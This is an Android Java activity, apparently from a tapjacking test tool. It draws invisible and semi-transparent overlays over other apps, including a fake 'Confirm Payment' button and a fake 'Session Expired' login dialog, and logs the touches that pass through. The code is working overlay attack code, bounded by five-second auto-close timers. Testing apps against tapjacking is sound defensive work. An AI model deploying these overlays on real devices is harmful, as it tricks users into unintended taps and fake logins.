package com.mobiscan.tapjacktester;

import android.app.Activity;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.Gravity;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.LinearLayout;
import android.widget.TextView;

/**
 * Invisible Overlay Activity - draws transparent windows over other apps.
 * Used by tapjacking tests TJ-01, TJ-04, TJ-05, TJ-07, TJ-08.
 */
public class InvisibleOverlayActivity extends Activity {

    private WindowManager windowManager;
    private Handler handler = new Handler(Looper.getMainLooper());
    private boolean isOverlayActive = false;
    private StringBuilder touchLog = new StringBuilder();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        String mode = getIntent().getStringExtra("mode");

        if (mode == null) mode = "invisible";

        switch (mode) {
            case "invisible":
                createInvisibleOverlay();
                break;
            case "partial_bottom":
                createPartialOverlay();
                break;
            case "dialog":
                createDialogOverlay();
                break;
            case "rapid_toggle":
                createRapidToggleOverlay();
                break;
            case "multi_layer":
                createMultiLayerOverlay();
                break;
            case "lifecycle":
                createLifecycleExploit();
                break;
            default:
                createInvisibleOverlay();
                break;
        }
    }

    private WindowManager.LayoutParams createLayoutParams(int width, int height, int gravity) {
        int type;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            type = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
        } else {
            @SuppressWarnings("deprecation")
            int t = WindowManager.LayoutParams.TYPE_PHONE;
            type = t;
        }

        return new WindowManager.LayoutParams(
                width, height, type,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                        WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                PixelFormat.TRANSLUCENT,
                gravity,
                0
        );
    }

    private void createInvisibleOverlay() {
        try {
            LinearLayout overlay = new LinearLayout(this);
            overlay.setOrientation(LinearLayout.VERTICAL);
            overlay.setBackgroundColor(0x01000000); // Nearly transparent

            // Touch logger
            overlay.setOnTouchListener((v, event) -> {
                touchLog.append("Touch at (").append(event.getX()).append(", ")
                        .append(event.getY()).append(") action=")
                        .append(event.getAction()).append("\n");
                return false; // Let touches pass through (tapjacking proof)
            });

            WindowManager.LayoutParams params = createLayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    Gravity.TOP | Gravity.START
            );

            // Invisible overlay — capture but don't block touches
            overlay.setAlpha(0.01f);

            windowManager.addView(overlay, params);
            isOverlayActive = true;

            // Auto-close after 5 seconds
            handler.postDelayed(() -> {
                try {
                    windowManager.removeView(overlay);
                } catch (Exception ignored) {}
                isOverlayActive = false;
                finish();
            }, 5000);

        } catch (Exception e) {
            finish();
        }
    }

    private void createPartialOverlay() {
        try {
            // Create overlay on bottom 150px (where buttons typically are)
            LinearLayout overlay = new LinearLayout(this);
            overlay.setOrientation(LinearLayout.VERTICAL);
            overlay.setBackgroundColor(0x0500FF00); // Slightly green tint
            overlay.setAlpha(0.1f);

            // Show attacker's fake "Confirm" button
            TextView fakeButton = new TextView(this);
            fakeButton.setText("✓ Confirm Payment");
            fakeButton.setTextSize(18);
            fakeButton.setTextColor(0xFFFFFFFF);
            fakeButton.setBackgroundColor(0xFF2196F3);
            fakeButton.setPadding(40, 20, 40, 20);
            fakeButton.setGravity(Gravity.CENTER);
            overlay.addView(fakeButton);

            overlay.setOnTouchListener((v, event) -> {
                // Log the touch but let it pass to the real button underneath
                touchLog.append("Bottom overlay touch: ").append(event.getRawX())
                        .append(",").append(event.getRawY()).append("\n");
                return false; // Pass through
            });

            WindowManager.LayoutParams params = createLayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    150,
                    Gravity.BOTTOM | Gravity.START
            );

            windowManager.addView(overlay, params);

            handler.postDelayed(() -> {
                try { windowManager.removeView(overlay); } catch (Exception ignored) {}
                finish();
            }, 5000);

        } catch (Exception e) {
            finish();
        }
    }

    private void createDialogOverlay() {
        try {
            // Semi-transparent dialog-like overlay
            LinearLayout dialogOverlay = new LinearLayout(this);
            dialogOverlay.setOrientation(LinearLayout.VERTICAL);
            dialogOverlay.setGravity(Gravity.CENTER);
            dialogOverlay.setBackgroundColor(0x80000000); // 50% transparent black

            // Create dialog box in center
            LinearLayout dialogBox = new LinearLayout(this);
            dialogBox.setOrientation(LinearLayout.VERTICAL);
            dialogBox.setGravity(Gravity.CENTER);
            dialogBox.setBackgroundColor(0xFF2D2D2D);
            dialogBox.setPadding(40, 40, 40, 40);

            TextView title = new TextView(this);
            title.setText("⚠ Session Expired");
            title.setTextColor(0xFFFFFFFF);
            title.setTextSize(20);
            title.setGravity(Gravity.CENTER);

            TextView message = new TextView(this);
            message.setText("Please log in again to continue.");
            message.setTextColor(0xFFCCCCCC);
            message.setTextSize(14);
            message.setGravity(Gravity.CENTER);
            message.setPadding(0, 20, 0, 20);

            TextView loginBtn = new TextView(this);
            loginBtn.setText("LOG IN");
            loginBtn.setTextColor(0xFF2196F3);
            loginBtn.setTextSize(16);
            loginBtn.setGravity(Gravity.CENTER);
            loginBtn.setPadding(0, 20, 0, 0);

            dialogBox.addView(title);
            dialogBox.addView(message);
            dialogBox.addView(loginBtn);
            dialogOverlay.addView(dialogBox);

            dialogOverlay.setOnTouchListener((v, event) -> {
                touchLog.append("Dialog overlay touch at ").append(event.getRawX())
                        .append(",").append(event.getRawY()).append("\n");
                return false;
            });

            WindowManager.LayoutParams params = createLayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    Gravity.CENTER
            );
            params.alpha = 0.9f;

            windowManager.addView(dialogOverlay, params);

            handler.postDelayed(() -> {
                try { windowManager.removeView(dialogOverlay); } catch (Exception ignored) {}
                finish();
            }, 5000);

        } catch (Exception e) {
            finish();
        }
    }

    private void createRapidToggleOverlay() {
        try {
            LinearLayout overlay = new LinearLayout(this);
            overlay.setBackgroundColor(0x01000000);
            overlay.setAlpha(0.01f);

            WindowManager.LayoutParams params = createLayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    Gravity.TOP | Gravity.START
            );

            windowManager.addView(overlay, params);
            isOverlayActive = true;

            // Rapidly toggle overlay visibility 50 times
            final int[] toggleCount = {0};
            Runnable toggle = new Runnable() {
                @Override
                public void run() {
                    if (toggleCount[0] >= 50) {
                        try { windowManager.removeView(overlay); } catch (Exception ignored) {}
                        isOverlayActive = false;
                        finish();
                        return;
                    }
                    overlay.setVisibility(toggleCount[0] % 2 == 0 ? View.INVISIBLE : View.VISIBLE);
                    toggleCount[0]++;
                    handler.postDelayed(this, 60); // ~50 toggles in 3 seconds
                }
            };
            handler.postDelayed(toggle, 100);

        } catch (Exception e) {
            finish();
        }
    }

    private void createMultiLayerOverlay() {
        try {
            // Create 5 stacked overlays at different z-levels
            for (int i = 0; i < 5; i++) {
                final int layer = i;
                LinearLayout overlay = new LinearLayout(this);
                overlay.setBackgroundColor(0x01000000);
                overlay.setAlpha(0.01f);

                overlay.setOnTouchListener((v, event) -> {
                    touchLog.append("Layer ").append(layer)
                            .append(" touch: ").append(event.getRawX())
                            .append(",").append(event.getRawY()).append("\n");
                    return false;
                });

                WindowManager.LayoutParams params = createLayoutParams(
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.MATCH_PARENT,
                        Gravity.TOP | Gravity.START
                );

                windowManager.addView(overlay, params);
            }

            handler.postDelayed(() -> finish(), 5000);

        } catch (Exception e) {
            finish();
        }
    }

    private void createLifecycleExploit() {
        try {
            // Launch invisible overlay, then immediately start background capture
            // This exploits the lifecycle transition

            LinearLayout overlay = new LinearLayout(this);
            overlay.setBackgroundColor(0x01000000);
            overlay.setAlpha(0.01f);

            WindowManager.LayoutParams params = createLayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    Gravity.TOP | Gravity.START
            );

            windowManager.addView(overlay, params);

            // Monitor for activity transitions
            handler.postDelayed(() -> {
                try { windowManager.removeView(overlay); } catch (Exception ignored) {}
                finish();
            }, 5000);

        } catch (Exception e) {
            finish();
        }
    }

    @Override
    public void onBackPressed() {
        // Don't allow user to dismiss easily
        super.onBackPressed();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        handler.removeCallbacksAndMessages(null);
    }
}
